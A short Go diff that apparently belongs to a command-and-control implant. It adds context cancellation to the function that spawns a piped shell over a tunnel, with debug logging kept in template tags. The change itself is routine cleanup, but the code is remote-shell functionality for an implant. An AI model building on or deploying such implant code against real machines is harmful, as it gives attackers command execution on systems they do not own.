@@ -26,6 +26,7 @@ import (
 	"log"
 	// {{end}}
 
+	"context"
 	"os/exec"
 )
 
@@ -51,12 +52,15 @@ func pipedShell(tunnelID uint64, command []string) (*Shell, error) {
 	log.Printf("[shell] %s", command)
 	// {{end}}
 
-	cmd := exec.Command(command[0], command[1:]...)
+	ctx, cancel := context.WithCancel(context.Background())
+
+	cmd := exec.CommandContext(ctx, command[0], command[1:]...)
 	stdin, err := cmd.StdinPipe()
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[shell] stdin pipe failed\n")
 		// {{end}}
+		cancel()
 		return nil, err
 	}
 	stdout, err := cmd.StdoutPipe()
@@ -64,6 +68,7 @@ func pipedShell(tunnelID uint64, command []string) (*Shell, error) {
 		// {{if .Config.Debug}}
 		log.Printf("[shell] stdout pipe failed\n")
 		// {{end}}
+		cancel()
 		return nil, err
 	}
 
@@ -72,6 +77,7 @@ func pipedShell(tunnelID uint64, command []string) (*Shell, error) {
 		Command: cmd,
 		Stdout:  stdout,
 		Stdin:   stdin,
+		Cancel:  cancel,
 	}, nil
 }
 
